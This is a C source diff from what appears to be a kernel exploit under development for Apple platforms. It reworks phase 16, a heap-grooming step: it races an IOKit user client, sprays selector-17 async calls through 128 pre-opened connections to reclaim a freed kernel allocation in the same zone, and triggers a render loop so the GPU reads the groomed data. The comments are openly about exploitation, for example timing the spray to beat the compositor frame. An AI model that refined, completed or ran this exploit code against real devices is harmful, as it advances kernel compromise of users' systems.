@@ -19818,6 +19818,28 @@ new_modes:
 
             uint64_t inp16[3] = {1, 2, 3};
 
+            /* Pre-open groom connections ONCE (before any race).
+             * This way the groom spray is just sel17 calls — no slow IOServiceOpen.
+             * Also pre-allocate wake ports for speed. */
+            #define GROOM16_CONNS 128
+            io_connect_t groom_cs16[GROOM16_CONNS];
+            mach_port_t groom_wp16[GROOM16_CONNS];
+            int groom_n16 = 0;
+            if (rounds <= 163) {
+                for (int g = 0; g < GROOM16_CONNS; g++) {
+                    io_connect_t gc = IO_OBJECT_NULL;
+                    if (IOServiceOpen(svc16, mach_task_self(), 0, &gc) == KERN_SUCCESS) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                        groom_cs16[groom_n16] = gc;
+                        groom_wp16[groom_n16] = gwp;
+                        groom_n16++;
+                    }
+                }
+                rlog("  Pre-opened %d groom connections\n", groom_n16);
+            }
+
             for (int iter = 0; iter < 10; iter++) {
                 /* ---- STEP 1: Race WITHOUT render loop ---- */
                 io_connect_t cs16[8];
@@ -19856,36 +19878,21 @@ new_modes:
                 rlog("  [%d] race done, spam=%llu\n", iter,
                      (unsigned long long)p13_spam_count);
 
-                /* ---- STEP 2: Groom with sel17 (same zone as freed entry) ---- */
-                /* OOL mach_msg goes to kalloc_data — wrong zone.
-                 * sel17 entries go to the SAME type-specific zone.
-                 * Open fresh connections, call sel17 with controlled input. */
-                #define GROOM16_CONNS 64
-                io_connect_t groom_cs16[GROOM16_CONNS];
-                int groom_ok16[GROOM16_CONNS];
+                /* ---- STEP 2: FAST groom spray (sel17 on pre-opened conns) ---- */
+                /* Only sel17 calls here — connections already open.
+                 * Must be faster than compositor frame (~8ms). */
                 int groom_sent = 0;
-
                 if (rounds <= 163) {
-                    for (int g = 0; g < GROOM16_CONNS; g++) {
-                        groom_ok16[g] = (IOServiceOpen(svc16, mach_task_self(), 0,
-                                         &groom_cs16[g]) == KERN_SUCCESS);
-                        if (groom_ok16[g]) {
-                            mach_port_t gwp = MACH_PORT_NULL;
-                            mach_port_allocate(mach_task_self(),
-                                MACH_PORT_RIGHT_RECEIVE, &gwp);
-                            mach_port_insert_right(mach_task_self(), gwp, gwp,
-                                MACH_MSG_TYPE_MAKE_SEND);
-                            uint64_t gref = 0xAA00000000000000ULL | g;
-                            IOConnectCallAsyncMethod(groom_cs16[g], 17, gwp,
-                                &gref, 1, NULL, 0, g16, 24, NULL, NULL,
-                                NULL, NULL);
-                            mach_port_deallocate(mach_task_self(), gwp);
-                            groom_sent++;
-                        }
+                    for (int g = 0; g < groom_n16; g++) {
+                        uint64_t gref = 0xAA00000000000000ULL | (iter << 8) | g;
+                        IOConnectCallAsyncMethod(groom_cs16[g], 17,
+                            groom_wp16[g], &gref, 1, NULL, 0,
+                            g16, 24, NULL, NULL, NULL, NULL);
+                        groom_sent++;
                     }
                 }
 
-                rlog("  [%d] groom sent=%d (sel17 conns)\n", iter, groom_sent);
+                rlog("  [%d] groom sent=%d (fast sel17)\n", iter, groom_sent);
 
                 /* ---- STEP 3: Start render loop → GPU reads groomed data ---- */
                 int did_render = (rounds != 164);
@@ -19900,19 +19907,17 @@ new_modes:
                     rlog("  [%d] render done, frames=%d\n", iter, p13_render_frames);
                 }
 
-                /* ---- STEP 4: Cleanup — close groom connections ---- */
-                for (int g = 0; g < GROOM16_CONNS; g++) {
-                    if (groom_ok16[g]) {
-                        IOServiceClose(groom_cs16[g]);
-                        groom_ok16[g] = 0;
-                    }
-                }
-
                 rlog("  [%d] survived (%s)\n", iter,
                      did_render ? "with render" : "no render");
             }
 
             rlog("  Phase 16: All 10 iterations survived!\n");
+
+            /* Cleanup: close all pre-opened groom connections */
+            for (int g = 0; g < groom_n16; g++) {
+                IOServiceClose(groom_cs16[g]);
+                mach_port_deallocate(mach_task_self(), groom_wp16[g]);
+            }
             IOObjectRelease(svc16);
         }
         phase16_done:
